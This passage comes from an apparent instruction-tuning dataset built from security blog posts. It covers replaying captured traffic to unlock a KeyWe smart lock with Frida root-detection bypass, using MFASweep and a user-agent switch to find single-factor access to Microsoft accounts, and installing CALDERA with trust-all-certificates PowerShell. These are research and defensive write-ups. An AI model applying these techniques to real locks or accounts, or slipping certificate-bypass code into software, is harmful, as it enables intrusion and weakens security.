the number of domains that BHIS sends email to on a daily basis emails that BHIS doesn't send to domains that received email indicating BHIS as the origin domain forensic reports of authorized email It's worth noting that not all recipient mail servers send forensic reports of unauthorized email but typically will include the failure result in its aggregate report email You might be thinking isn't that a lot of emails about emails You guys actually read those Yes kinda It is a huge amount of emails that we never read It's all automated More on that next time when we ask Hey what's that spike of invalid mails sent All in all that's a long story short about a 1 line email Now get those emails in my inbox without getting tagged and start making money Post-Blog Banter Why this blog exists Every day I get emails from various companies from industries trying to sell their products At BHIS we've grown accustomed to non-traditional marketing focusing on client and community relationships over mass-emails But we're not dogging we don't run our business like others our atypical strategies aren't for everyone and they don't come without its own type of painful stories and problems Traditional marketing is still important and when we see our competitors friends actually making a potential pricey misstep we want to help At BHIS we have a mantra Proudly Sucking at Capitalism Sometimes doing the RIGHT thing isn't profitable at all This blog is probably one of those cases It certainly didn't take five minutes to write this blog editors were assigned peer-reviewers recommended modifications someone fixed my tYpos someone uploaded and published it and someone else may have notified you Helping our competitors friends marketing endeavors probably isn't in the best interest of the BHIS bottom line but it is in our other interests We seriously do want to make it the world better and if helping you get your valid idea out there helps well good Franky I'm saddened that I've grown fatigued by the number of emails for X product or Y service that we Tag as being suspicious not on merit of the product or service but merely on the fact the marketing campaign sent emails that were considered unauthorized The result can be costly Our visibility in the lack of authorization is not why we built the email-tagging system it's just a by-product In fact if we didn't have that tagging system I wouldn't even know I received the email because it would have hit the spam black hole never to be seen except when hunting for an unrelated missing email Make your ideas heard Make the world a better place Go forth and do good things"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Reverse Engineering a Smart Lock</title>\n<taxonomies>Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Thu, 27 Aug 2020 12:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch INTRODUCTION Recently I was afforded the opportunity to research the findings of a well-known security firm F-Secure who had discovered a vulnerability in the Guardtec KeyWe Smart Lock The F-Secure people found that due to a design flaw an attacker could intercept and decrypt traffic coming from a legitimate owner of the lock I found their blog posted in December of 2019 to be extremely fascinating and very informative I soon became motivated to see if I could duplicate their efforts realizing that F-Secure had issued an advisory and that the vendor had been given an opportunity to mitigate their exposure Unfortunately their mitigation options were extremely limited due to the fact that they had no firmware update functionality Instead they chose to use obfuscation in their android app in an attempt to hide the more relevant sections of code which they did quite well I might add Although F-Secure had laid the groundwork they were careful not to reveal too much information and even REDACTED some of their own tools thereby retaining the 'keys to the kingdom as they put it During my journey I found myself constantly going back to their blogs especially as I discovered new and relevant information of my own This blog is intended to not only consolidate my notes and document my research but to maybe inform others of some pretty cool tools and methods for reverse engineering Android iOS applications After receiving the shipment of my KeyWe Smart Lock and creating a test fixture to mount it I downloaded the android app to my mobile phone and created my account I got familiar with the functionality of the lock and the look and feel of the mobile app I also ran my Nordic nRF Connect mobile app available for free on Google Play store to gain useful information about my lock such as the Bluetooth address primary service UUIDs characteristics etc Note Understanding Bluetooth Low Energy GATT and GAP is beyond the scope of this write-up however the BLE specifications are easily accessible here ww.bluetooth.com specifications should you want to read up USEFUL INFORMATION Communications between the KeyWe lock and the mobile App are transported via Bluetooth Low Energy BLE packets which are encrypted using the standard ECB AES-128 cipher in order to prevent third-party eavesdropping The security of the message channel is based solely upon 3 secret keys used for the encrypting and decrypting of the OTA over-the-air AES-128 packets Common Key CommonKey used for the initial key exchange App Key AppKey used to encrypt packets sent by the App to the Door Door Key DoorKey used to encrypt packets sent by the Door to the App KEY GENERATION The CommonKey is based entirely on a static 16-byte value which is simply enumerated with the last 5 bytes of the device's Bluetooth address as follows Upon further examination of the CommonKey on multiple KeyWe devices it appears the only difference between all devices examined were the last two bytes of the device Bluetooth address In my case the values 4C and 93 were unique to my device This suggests that the CommonKey is highly predictable and based solely on two bytes within a 16-byte static value per device The AppKey and DoorKey are created from two algorithms and heavily obfuscated methods makeAppKey and makeDoorKey The F-Secure people created a nice tool that generates the three secret keys by simulating the action of these two methods although they REDACTED and obfuscated their work rendering it generally harmless After some considerable time however I was able to reverse engineer the functionality of these two methods myself working with a handy open-source tool called Frida more on this later AppKey and DoorKey creation consists of passing two arguments to the makeAppKey and makeDoorKey functions These two arguments are AppNumber and DoorNumber respectively AppNumber is a static hard-coded 12-byte value padded with four zero bytes 92 4b 03 5f bd a5 6a e5 ef 0e d0 5a 00 00 00 00 Note AppNumber is encrypted with the CommonKey and sent to the Door lock as the very first packet transmission of the user session thereby initiating commencement of the session DoorNumber is a dynamic changes every new session 12-byte value padded with four zero bytes generated by the Door lock This value also encrypted with the CommonKey is sent to the App in response to receiving the AppNumber see diagram below Note These two 'opening transmissions AppNumber and DoorNumber complete the initial key exchange process and allow for the creation of the AppKey and DoorKey which will afford secure OTA communications between the App and Door going forward Now that the AppNumber and DoorNumber have been created and exchanged we have the two components required for generating the remaining two secret keys AppKey and DoorKey This is accomplished by calling the makeAppKey and makeDoorKey functions with AppNumber and DoorNumber as arguments This is done internally within the firmware and not sent OTA APPLICATION FLOW DIAGRAM Now that we have generated and exchanged AppKey and DoorKey each side can now encrypt decrypt packets sent or received All packets transmitted by the App will be encrypted using the AppKey and all packets transmitted by the Door will be encrypted using the DoorKey Both sides know each other's encryption scheme and can therefore decrypt the packet The following diagram demonstrates the order of events of a typical user session It should be noted that all of these packets are transmitted OTA at the beginning of every user session and all 13 of these packets are encrypted with either the AppKey or the DoorKey depending upon the transport direction REVERSING THE ANDROID APK All mobile applications are downloaded as APK Android Application Package files APK files are saved in ZIP format and are typically downloaded directly to Android devices usually by way of the Google Play store but can also be found on other websites When reverse engineering android APKs I find that it is often helpful to use third party sites to search for older versions of the APK in question A favorite of mine is pkpure.com Software Requirements Java version 1.8.0_251 ADB android debug bridge version 1.0.41 APKStudio wrapper for Apktool version 2.4.1 Dex2Jar version Jadx version 1.1.0 Frida version 12.8.9 Hardware Requirement Rooted android phone A typical APK contains some very useful content such as an AndroidManifest.xml classes.dex and resource.arsc file as well as a Meta-INF and res folder There are a few different ways to open an APK residing on your PC Obviously because it is a ZIP file any of the various UNZIP extractors will work just fine however using tools like Dex2Jar Apktool and Jadx to name a few offer additional advantages such as converting .dex files to java code for better readability and GUI support for ease of navigating the code DEX files Dalvik executable files are developer files used to initialize and execute applications for the Android mobile platform Tools like Apktool can decompile the DEX machine language files into Smali assembly language source files We can also use tools like dex2jar to convert DEX files to JAR java files and use jadx GUI to open the JAR file as java source code Java source code can be a lot easier to read than Smali source There are many options available to navigate the Android APK including a favorite of mine APKStudio With the many options available it would be beyond the scope of this write-up to describe the various steps involved with implementing any one of these tools I would suggest downloading them and experimenting with several techniques to find your best fit There are plenty of helpful tutorials out there USING FRIDA The F-Secure researchers stated in their blog that they were able to intercept function calls in the android app using a tool called Frida I was not aware of this tool so I decided to check it out This tool is amazing Understanding how to implement Frida is beyond the scope of this write-up However suffice to say Frida allows a researcher the ability to attach to existing functions within an application and dynamically dump the arguments and return values This is most definitely worth checking out rida.re docs home Frida w toolkit installation pip install frida pip install frida-tools Requirements frida-server and adb android debug bridge rooted android phone for debugging apk I used an old Samsung GS5 Install frida-server on rooted phone To install the server navigate to ithub.com frida frida releases and download the appropriate file for the specific phone platform being used If you are not sure of the phone's architecture download and run Droid Hardware Info from Google Play store Copy the downloaded file to your project directory Navigate to your project directory Unzip the .xz file with xz -d -k frida-server-12.9.8-android-arm.xz Using adb android debug bridge tool push the extracted file to the rooted phone INITIAL SETUP installs frida-server on rooted phone adb push frida-server-12.9.4-android-arm data local tmp adb shell shell into phone su root level user cd data local tmp chmod 777 frida-server frida-server start frida-server daemon Once the frida-server is installed on the rooted phone begin a new session as follows adb shell su cd data local tmp frida-server Initially I had a difficult time coordinating the learning of a new tool Frida with the added burden of trying to find the same function calls that the F-Secure people referenced in their blogs Due to the F-Secure advisory the vendor heavily obfuscated the latest releases meaning no more 'makeAppKey or 'makeDoorKey functions to attach to I also discovered that the vendor incorporated security measures to prevent running the KeyWe application on rooted phones The F-Secure researchers created a cool tool using python and a Frida javascript to attach to the offending method and injected java code to always return false to 'isRooted Unfortunately due to the heavy obfuscation of my newer version of the Android APK the 'RootTool class did not exist and I was forced to search my APK code in an attempt to find it's equivalent class After a considerable amount of time searching the code I eventually located the root check methods It turned out the 'RootTool class was now referenced as 'n and the 'iSRooted function is now referenced as function 'b Modified F-Secure's KeyWe-Tooling script according to my search findings Resulted in successfully evading the root detection Moving along I determined that working with the latest release of the android application was more trouble than it was worth The obfuscation was immense and becoming extremely tedious and frustrating trying to find functions whose names had been changed to a single letter Fortunately about this time a colleague provided me with a link to some older KeyWe android APK's pkpure.com keywe-for-a-smarter-life com.guardtec.keywe versions This turned out to be a great find as now I could snag a version just prior to the advisory with all referenced functions still intact I proved this by returning to the original unmodified version of the F-Secure root-evasion script and it worked Also I learned that their 'trace_java_functions tool now worked as well providing me with an enormous amount of definitive data to work with In the following Frida hexdump example we can see the call being made to the AES-128 cipher function generated by the App passing two byte_array arguments AppNumber CommonKey This is clearly encrypting the AppNumber with the CommonKey for the OTA packet transmission to the Door starting the session sequence of events Likewise this example also shows another call being made to the AES-128 cipher function passing the arguments DoorNumber CommonKey to encrypt the DoorNumber for OTA transmission to the App Lastly from this example Frida allows us to see the arguments passed and the return values of the two internal function calls that generate the AppKey and DoorKey Based upon many Frida sessions captured and the deciphering of the data I soon became very familiar with the KeyWe application and had a good understanding of how and where the important keys were generated as well as the sequence of events on start-up In addition I learned that during an active session the status of the door is constantly monitored and updated by information exchanged between the App and the Door My sessions included signing in unlocking and locking the Door using the App on my phone F-Secure Frida java scripts Evade root-detection disable_root_detection.js Trace injected java functions trace_java_functions.js original Session includes Sign-in wait for connection and for LOCKED red status Click to UNLOCK wait a few seconds click to LOCK wait a few seconds Click to UNLOCK wait for auto-LOCK disconnect C Users rayfe keywe-tooling frida start_root.py C Users rayfe keywe-tooling frida keywe_inject.py trace_java_functions.js BTSNOOP Android Bluetooth HCI logger Ultimately BTSNOOP has to be one of my greatest finds when wanting to capture a complete Bluetooth session between central phone and peripheral lock I attempted various methods to capture my OTA Bluetooth sessions including Nordic's nRF Sniffer development board nRF52840-DK Sena's UD100 dongle the Ubertooth-One and Texas Instruments CC2540 dongle The problem with all of these approaches is they couldn't follow the connection due to Bluetooth Low Energy BLE channel hopping The Nordic nRF52840-DK came close when using it together with Wireshark and Nordic's BLE sniffer plugin but unfortunately the packet captures were at the Link Layer rather than the host controller interface layer resulting in encrypted data that was unable to be parsed Being that it was not captured at the HCI layer meant that it was susceptible to built in CCM AES-128 BLE security key exchange protocol handshakes From what I could determine this meant if the nRF52840-DK was not sniffing at the time of the pairing it would miss the security handshake entirely resulting in no decryption of the packets IMPORTANT nRF Sniffer shortcoming It appears that if the KeyWe lock executes a channel hop after pairing but before the App transmits the 1st packet the nRF Sniffer will miss the initial CCM AES-128 BLE security key exchange This would result in encrypted 'useless packets This is a shortcoming of the nRF Sniffer's inability to follow the channel map Note the CCM AES-128 BLE security key exchange is a security protocol found in all Bluetooth Low Energy OTA wireless connections to prevent MiM eavesdropping CCM AES-128 BLE security key exchange this is general information unrelated to the KeyWe project The temporary key is used during the Bluetooth pairing process The short term key is used as the key for encrypting a connection the very first time devices pair The short term key is generated by using three pieces of information the Temporary Key and two random numbers one generated by the slave and one generated by the master Once the connection is encrypted with the short term key the other keys are distributed The Long Term Key replaces the short term key to encrypt the connection The Identity Resolving Key is used for privacy The Connection Signature Key is used for authentication Fortunately there is an excellent way to capture Bluetooth traffic using your android device On your Android phone Go to settings If developer options is not enabled enable it now Go to developer options Enable the option Enable Bluetooth HCI snoop log Perform the actions which need to be captured session Disable the option Enable Bluetooth HCI snoop log Copy the file to PC using ADB Android Debug Bridge The file of interest is btsnoop_hci.log Note Typically I'll leave the option Enable Bluetooth HCI snoop log enabled as it's on my rooted test phone Obtain btsnoop_hci.log of complete bluetooth session Listed android files Pulled btsnoop_hci log files Renamed btsnoop_hci.log to btsnoop_hci-07-31-20.log appended with my session date WIRESHARK ANALYSIS Importing the btsnoop_hci.log into Wireshark we can see the OTA encrypted packet exchanges This in conjunction with the Frida function hexdumps provides a valuable way to cross-reference the activity of the user session From the massive number of sessions generated during my research of the KeyWe lock I can confirm these packet exchanges follow the same sequence every session and never vary in the least In the following example we can see the opening key exchange initiated by the App and followed by the Door EXAMPLE 1 APP sends AppNumber DOOR returns DoorNumber DOOR sends Hello Interesting note in the screenshot above fb2b28c68b3f99c514b98fada4bf0b89 transmission 2 can be decrypted with the CommonKey to reproduce the DoorNumber This can be verified by using the free online AES-128 Cipher tool here es.online-domain-tools.com Enter the encrypted packet fb2b28c68b3f99c514b98fada4bf0b89 and enter the secret key CommonKey c88ff4150f4a4c27934a6c5e6741efac followed by clicking Decrypt Using the online AES-128 Cipher tool is a handy way to correlate the Wireshark session data with the Frida hexdump data The next few screenshots show examples of how the various Bluetooth OTA traffic coincides with the known function calls of the App This provides us with an enormous amount of information regarding program flow and execution Example 2 APP sends Welcome DOOR sends START APP and DOOR both exchange doorMode Example 3 APP sends eKey DOOR sends eKey authentication and authorization Example 4 DOOR STATUS doorTimeSet exchanges Example 5 DOOR STATUS exchanges REPLAY ATTACK As can be seen by the screenshots above the entire Bluetooth session can be analyzed in Wireshark using the btsnoop_hci.log capture and compared side by side against the data found using the Frida tools Also notice that every one of the encrypted packets being sent over the air OTA can be decrypted by simply determining the transport direction App to Door or Door to App and using the appropriate key AppKey or DoorKey to decrypt Now that we have the keys and know how to interpret all of the data we can attempt to operate the lock with a replay attack Again F-Secure provided a nice tool in their Github that they called 'open_from_pcap Based upon information in their pre-recorded pcap session this tool allowed them to replay the session and operate the lock Of course this tool was rendered harmless when they REDACTED their keys.py script However as I stated earlier I was eventually able to reverse engineer the functionality So by swapping F-Secure's REDACTED keys.py with my own version it allowed me to implement the 'open_from_pcap tool on my btsnoop_hci.log capture Using my Sena UD100 Bluetooth USB adapter the first result of running the 'open_from_pcap script appears below Apparently my modified keys.py correctly determined the CommonKey AppKey and DoorKey but failed at the eKeyVerify stage Without getting too deep into F-Secure's coding the open_from_pcap python script calls a function in another script decode_from_pcap which supposedly retrieves the eKey from the session pcap Unfortunately that did not work properly for me Maybe it was related to a difference in format structure of their pcap file versus my btsnoop_hci.log file saved as pcap from within a Wireshark session Regardless I decided to forego the deciphering of their code and instead modified the 'open_from_pcap file to use my hardcoded eKey rather than trying to retrieve it By the way the reason that the F-Secure people needed to retrieve the key from the pcap is because the eKey is stored online when the account is created and not present in any OTA transmissions It is however detectable using Frida by injecting a javascript into the eKeyVerify function which provides a hexdump of the return value see below As you can see from the screenshot above as part of my testing I decided to delete my OLD KeyWe account and create a NEW account By doing so I might be able to determine what changes occur from one user account to another and if the eKey might be predictable From what I can see there are no obvious detectable patterns The eKey also known as the User password is generated when the owner creates their account so it makes sense that the key is totally randomized and potentially derived from the User Password during account setup Also when I created the new account I intentionally changed only one character in the original password My intention here was that this might help me determine if the eKey was derived solely from the User Password In my opinion it appears it was not From the screenshot above it seems pretty clear that the eKeyVerify function was called by the App and the argument passed was a 6-byte value eKey The returned value can be assumed to be a modified resultant eKey to be sent by the App encrypted with the AppKey to the Door Without digging deeper into the code I can only assume that the 6-byte value eKey provides a link to the actual modified eKey stored away Regardless this 6-byte eKey is all that's required to complete the replay session Hard-coding the eKey into the replay.py script resulted in the following replay session SUCCESS This replay was successful because I was able to obtain the eKey used for authentication and authorization by extracting it from my rooted phone using Frida As it stands right now this replay attack would not work in the wild due to the fact that the eKey of a legitimate owner is not accessible in this manner Likewise as I stated earlier the eKey is not transmitted OTA Well that statement is not entirely true Consider the following snippet captured by my phone's btsboop_hci.log and the corresponding Frida hexdump of the eKeyVerify function The Wireshark capture shows the opening packet transfers key exchanges handshakes etc Pay close attention to the 8th packet in this session It shows the encrypted packet sent by the App containing the modified eKey value From the Frida hexdump notice also that the 6-byte eKey value is enumerated into bytes 5 11 of the modified eKey value Based upon our learned knowledge of how this packet is encrypted before transmission we know that it will be an AES-128 cipher using the AppKey as the secret key Using the online AES-128 Cipher tool to decrypt the 8th OTA encrypted packet 46402315a85a72e66e9671d044b513af using the AppKey e022c1193ebb3882efc9cf79b6e557d1 as the secret key we would get the decrypted modified eKey And as we know the 6 byte eKey value is enumerated into bytes 5 11 of the decrypted modified eKey value See below This little exercise clearly shows that if we can do an OTA capture of the opening packet exchange of a legitimate owner in the wild we would have everything we need including their User Password eKey to compromise their home security and unlock their door SUMMARY I have to admit that I spent an enormous amount of time with my research in the order of a few months on this project mainly because of dealing with the heavy obfuscation of the code but also due to the learning curve involved with learning any new tool Getting familiar with the Frida tool and a few of its many features and implementations was one of the high points of this project for me Furthermore it was equally rewarding to be able to reverse engineer an Android application while realizing it has been over a year since the F-Secure advisory was issued and the vendor having had sufficient opportunity to mitigate what they could Inasmuch I strongly agree with the findings of the F-Secure researchers in that firmware update capability would certainly have mitigated a great deal of their exposure and that using custom In-house crypto algorithms is never a good idea I'll close out this write-up by saying that I still have some unfinished research to deal with that being an OTA capture of a session between my non-rooted personal phone and the KeyWe lock in order to create a replay attack that WILL work in the wild Regardless to mitigate their exposure I strongly recommend that current owners of the Guardtec KeyWe Smart Lock upgrade their Mobile Application to the latest release as soon as possible version 2.1.0 at the time of this writing"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Exploiting MFA Inconsistencies on Microsoft Services</title>\n<taxonomies>Author, Beau Bullock, How-To, Informational</taxonomies>\n<creation_date>Tue, 29 Sep 2020 12:06:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Overview On offensive engagements such as penetration tests and red team assessments I have been seeing inconsistencies in how MFA is applied to the various Microsoft services Across Microsoft 365 and Azure there are multiple endpoints These endpoints can all be configured under different Conditional Access policy settings which sometimes lead to variations in how MFA is applied An organization that is trying to prevent single-factor access to email and or Azure may need to double-check their configurations to ensure MFA is enforced on all access portals To help both offensive operators and defenders check for MFA coverage on an account I wrote a tool called MFASweep that attempts to log in to various Microsoft services using a provided set of credentials to identify if MFA is enabled To jump straight to the tool click here ithub.com dafthack MFASweep Microsoft MFA Microsoft 365 and Azure have built-in MFA options Even free Microsoft accounts can use the MFA features More and more organizations are implementing MFA across accounts Microsoft MFA has a few different options for verification Microsoft Authenticator app OAUTH Hardware token SMS Voice call During offensive engagements we commonly perform password attacks such as password spraying or credential-based phishing Oftentimes if we successfully compromise a credential MFA can put a stop to any further activities However as shown in this blog post administrators have a lot of options to consider in terms of how that MFA is applied and where This can lead to misconfigurations and inconsistencies in MFA coverage Security Defaults When an organization signs up for Microsoft 365 it uses Azure AD as the directory for users Azure AD has a setting that is enabled by default called Security Defaults Security Defaults is a setting that helps protect Microsoft accounts by doing the following Requires all users to register for Azure Multi-Factor Authentication users have 14 days to register by default with the Authenticator app Requires administrators to perform multi-factor authentication Blocks legacy authentication protocols EWS IMAP SMTP or POP3 etc Requires users to perform multi-factor authentication when necessary Protects privileged activities like access to the Azure portal These settings tremendously help to protect access to an account Misconfigurations can arise when this setting gets disabled So why would you disable it Well as it turns out you can't have Security defaults enabled if you are also using Conditional Access policies Conditional Access Policies Conditional Access policies are the fine-grained controls over how a user is granted access to a resource These also can control when and where MFA is applied Conditional Access policies can be built around a number of different scenarios such as the user who is authenticating the location they are coming from the device they are using their real-time risk level and more For example I have tested organizations that utilized conditional access policies to allow single-factor access to Microsoft 365 from their IP space but required MFA everywhere else When setting up Conditional Access policies an admin has a number of different options to consider Do users need to authenticate to legacy protocols or will they only be using modern authentication Will they be authenticating from their phones desktops or both Will they be allowed to connect from home or only on-prem The ability for admins to allow or block certain protocols is where differences in MFA implementations are commonly seen across different organizations Some organizations I have done assessments for allow authentication to all the common portals while others lock access down tightly One of the more common areas I have seen single factor sneak into place is on legacy authentication-protocols Microsoft defines the following list as legacy Authenticated SMTP Used by POP and IMAP clients to send email messages Exchange ActiveSync EAS Used to connect to mailboxes in Exchange Online Autodiscover Used by Outlook and EAS clients to find and connect to mailboxes in Exchange Online Exchange Online PowerShell Used to connect to Exchange Online with remote PowerShell If you block Basic authentication for Exchange Online PowerShell you need to use the Exchange Online PowerShell Module to connect For instructions see Connect to Exchange Online PowerShell using multi-factor authentication Exchange Web Services EWS A programming interface that is used by Outlook Outlook for Mac and third-party apps IMAP4 Used by IMAP email clients MAPI over HTTP MAPI HTTP Used by Outlook 2010 and later Offline Address Book OAB A copy of address list collections that are downloaded and used by Outlook Outlook Anywhere RPC over HTTP Used by Outlook 2016 and earlier Outlook Service Used by the Mail and Calendar app for Windows 10 POP3 Used by POP email clients Reporting Web Services Used to retrieve report data in Exchange Online Other clients Other protocols identified as utilizing legacy authentication Access can be blocked to these via a Conditional Access policy applied to the Legacy authentication clients in the Client apps setting Legacy Authentication End-of-Life The good news is that Microsoft is planning on disabling legacy authentication The bad news is that due to COVID-19 the date for disabling it has moved back to the 2nd half of 2021 So it looks like we'll be checking for legacy authentication for a while longer echcommunity.microsoft.com t5 exchange-team-blog basic-authentication-and-exchange-online-april-2020-update ba-p 1275508 MFASweep Due to the variations I have been seeing in different organizations MFA setups on Microsoft Services I wrote a tool to automate authenticating to some of the different protocols MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA is enabled Depending on how conditional access policies and other multi-factor authentication settings are configured some protocols may end up being left single factor and this will tell you which ones It also has an additional check for ADFS configurations and can attempt to log in to the on-prem ADFS server if detected Currently MFASweep has the ability to log in to the following services Microsoft Graph API Azure Service Management API Microsoft 365 Exchange Web Services Microsoft 365 Web Portal Microsoft 365 Web Portal Using a Mobile User Agent Microsoft 365 Active Sync ADFS All you need is a set of valid credentials and the script Import the script into a PowerShell session then run one of the commands below WARNING This script attempts to log in to the provided account SIX 6 different times 7 if you include ADFS If you enter an incorrect password this may lock the account out This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API Azure Service Management API Microsoft 365 Exchange Web Services Microsoft 365 Web Portal both desktop and mobile browsers and Microsoft 365 Active Sync Invoke-MFASweep -Username targetuser targetdomain.com -Password Winter2020 This command runs with the default authentication methods and checks for ADFS as well Invoke-MFASweep -Username targetuser targetdomain.com -Password Winter2020 -Recon -IncludeADFS If you run MFASweep and find you have access to a certain Microsoft protocol you may be wondering what you can do with that access The next few sections give a quick overview of what you might be able to do Microsoft Graph API One of the best ways for working with the Graph API is to use the MSOnline PowerShell module The Graph API is primarily tied to Azure AD This allows you to view information from the directory such as users and groups To authenticate with MSOnline import the MSOnline PowerShell module and then run Connect-MsolService This will open the built-in PowerShell browser for authentication Import-Module MSOnline Connect-MsolService Or try passing the credential to a PowerShell variable first and then use the -Credential flag with Connect-MsolService I have seen where authenticating via this method bypassed some MFA restrictions credential Get-Credential Connect-MsolService -Credential credential For a list of some commands to run after authenticating see my cloud pentesting cheat sheets here ithub.com dafthack CloudPentestCheatsheets ROADTools should work here as well ithub.com dirkjanm ROADtools Azure Service Management API If the user has a subscription tied to their account you can leverage the Azure Service Management API to perform actions within the subscription To do this you could use the Az PowerShell module You can import it and authenticate with the command Connect-AzAccount Import-Module Az Connect-AzAccount Similar to the MSOnline module you could also use a PowerShell variable and pass it to Connect-AzAccount with the -Credential flag The cloud pentesting cheat sheets mentioned in the Microsoft Graph section should be useful here as well Microsoft Exchange Web Services EWS Access to EWS allows for reading a user's email getting the global address list converting email addresses to internal AD usernames and more You can use MailSniper to perform these actions ithub.com dafthack MailSniper When using MailSniper with EWS on Microsoft 365 make sure to use the -Remote flag as shown in the following command for authentication Invoke-SelfSearch -Mailbox targetuser targetdomain.com -ExchHostname outlook.office365.com -Remote Microsoft 365 Web Portal Log in with a browser at utlook.office365.com or ortal.azure.com Microsoft 365 Web Portal via Mobile Devices One conditional access policy I have seen organizations use allowed users to access O365 with a mobile device using single-factor authentication but trying in a desktop client required MFA This was set up using Device platforms as the condition As documented by Microsoft the device platform is identified by user agent so simply changing the user agent to a common mobile device can trigger this policy In the screenshot below I attempted to log in to an account via desktop web browser with a conditional access policy in place that only allowed mobile devices so MFA was required In the next screenshot I tried logging in to the same account after I changed my user agent using Chrome's built-in developer tools feature to mimic an Android device This time MFA was not required Shoutout to Nikhil Mittal for his tweet about this witter.com nikhil_mitt status 1287049649363144705 Microsoft 365 ActiveSync ActiveSync is treated as a separate Client app in Conditional Access policies instead of being lumped in with the other legacy protocols like IMAP EWS etc So there is potential there for legacy protocols like EWS to be blocked but access to ActiveSync is allowed Windows 10 has a built-in Mail application that supports ActiveSync To do this open Mail in Windows 10 and add an account Click Advanced setup Then click Exchange ActiveSync Fill out the information as shown in the screenshot below and click Sign in This should set up ActiveSync to start syncing email with the user's account ADFS Active Directory Federation Services is another common method for authenticating users that we see deployed With ADFS no credentials are stored in Azure When a user attempts to authenticate to Microsoft Online services such as Microsoft 365 a redirect occurs to a system hosted by the organization where authentication can occur One quick way to check if an organization has ADFS set up is to send a web request to the following URL substituting the targetuser targetdomain.com for any email address at the domain you are testing whether or not the user account exists doesn't matter just the domain ogin.microsoftonline.com getuserrealm.srf?login targetuser targetdomain.com xml 1 I added in a check for this into MFASweep The script automatically prompts asking if you want to check the domain for ADFS or you can specify the -Recon flag to force it The script also can attempt to log into the ADFS server letting you know if MFA is configured there Conclusion Before I released this tool I used it on a few real world engagements and found inconsistencies in MFA deployments that allowed me to gain access to information that was supposed to be protected I think that both red teamers and blue teamers can use this tool to gain a better understanding of the MFA coverage deployed to accounts Keep in mind these are not the only conditions possible With conditional access there are other possibilities for how it can be configured and multiple options can be combined to create more complex rules The checks I've included in MFASweep are some of the more common scenarios I have seen on engagements but there will likely be more added in the future If there are any other checks you would like to see in MFASweep send me a DM on Twitter and let me know Get MFASweep here ithub.com dafthack MFASweep"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Install Mitre CALDERA and Configure Your SSL Certificate</title>\n<taxonomies>How-To, Informational</taxonomies>\n<creation_date>Wed, 21 Oct 2020 17:31:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Darin Roberts If you would like to install the Mitre CALDERA server on your own the CALDERA GitHub page has installation instructions on their ReadMe here Detailed steps are provided below for installing CALDERA on Ubuntu and configuring it to use your SSL certification Clone the Repository git clone ithub.com mitre caldera.git --recursive --branch 2.8.1 Change directories into the CALDERA directory cd caldera Install PIP and the PIP requirements sudo apt install -y python3-pip pip3 install -r requirements.txt Install Go Installing Go is technically optional but it makes it so that agent executables are dynamically compiled and they avoid AV detection much better Download Go from olang.org doc install Extract the downloaded file your filename may vary sudo tar -C usr local -xzf go1.15.2.linux-amd64.tar.gz Update your PATH Add the following line to your HOME .bashrc file export PATH PATH usr local go bin Close the terminal and reopen to have the PATH changes take effect or use the source .bashrc command Confirm that GO is properly installed by checking its version go --version Start the server Create a copy of the CALDERA config file called local.yml and then edit it to set your own users and secure passwords cp caldera conf default.yml caldera conf local.yml Edit the local.yml file to change the usernames and passwords shown below to something more secure Start the CALDERA server python3 server.py Setup SSL Communications for the CALDERA Web Interface If your CALDERA web interface is reachable over an untrusted network you should enable encrypted communications as instructed below The encrypted communications are handled by the HAProxy tool Install HAProxy as follows sudo apt update sudo apt install haproxy After logging in to the CALDERA web interface on localhost 8888 go to the Advanced Configuration menu From the configuration menu enable the SSL plugin You can now reach the CALDERA web interface at https 8443 You also need to update your app.contact.http setting from the CALDERA web interface advanced configuration to include https as shown below update with the IP or domain name of your server Note Make sure you do not include a trailing slash on the URL Don't forget to click the green update button and restart the server after making the configuration changes Now that we have configured the app.contact.http setting we will see updated commands for deploying an agent using the http contact method 54ndc47 for example By default a self signed certificate is used for the SSL encryption Replace the self-signed certificate at caldera plugins ssl conf insecure_certificate.pem with your own if desired Need to create your own signed trusted certificate Try using Let's Encrypt You will need to own a domain name and configure a DNS authoritative record to point to your CALDERA server's IP address To use your own trusted cert create a combined pem file using the commands to below cd etc letsencrypt live cat cert.pem privkey.pem caldera plugins ssl conf insecure_certificate.pem Restart the CALDERA server after making these changes If you use the self-signed cert any PowerShell commands you run to get a remote agent are going to complain about not being able to establish a trust relationship You will need to bypass the trust check by running the PowerShell commands below before you execute the agent command this only applies if you are using the default self-signed cert class TrustAllCertsPolicy System.Net.ICertificatePolicy bool CheckValidationResult System.Net.ServicePoint a System.Security.Cryptography.X509Certificates.X509Certificate b System.Net.WebRequest c int d return true System.Net.ServicePointManager CertificatePolicy TrustAllCertsPolicy new Now your CALDERA SERVER is fully set up and ready to be put to use Check out the Attack Emulation Atomic Red Team CALDERA and More class to 